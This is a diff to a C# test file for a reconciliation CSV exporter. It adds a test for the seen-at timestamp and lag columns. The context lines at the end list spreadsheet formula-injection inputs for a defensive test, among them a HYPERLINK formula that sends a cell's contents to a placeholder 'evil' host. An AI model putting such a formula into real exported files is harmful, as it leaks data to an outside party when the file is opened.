@@ -90,6 +90,28 @@ public class StatementReconciliationDocumentTests
         csv.Should().Contain("оплата за пальне");
     }
 
+    [Fact]
+    public void The_Csv_Carries_When_We_Saw_The_Row_And_How_Late_It_Was()
+    {
+        // The acquirer's timestamp says when the money moved; ours says when the import learned
+        // about it. That pair is what tells a late row from a missing one, so it is in the file the
+        // accountant reads, not only in the database.
+        var act = Act();
+        var rows = act.Rows
+            .Select(r => r with
+            {
+                StatementSeenAtUtc = new DateTime(2026, 10, 5, 10, 35, 0, DateTimeKind.Utc),
+                StatementLagMinutes = 95
+            })
+            .ToList();
+
+        var csv = StatementReconciliationCsv.Render(act with { Rows = rows });
+
+        csv.Should().Contain("StatementSeenAt,LagMinutes");
+        csv.Should().Contain("\"2026-10-05 10:35:00\"");
+        csv.Should().Contain("\"95\"");
+    }
+
     [Theory]
     [InlineData("=HYPERLINK(\"http://evil/?d=\"&A1)")]
     [InlineData("+1+1")]
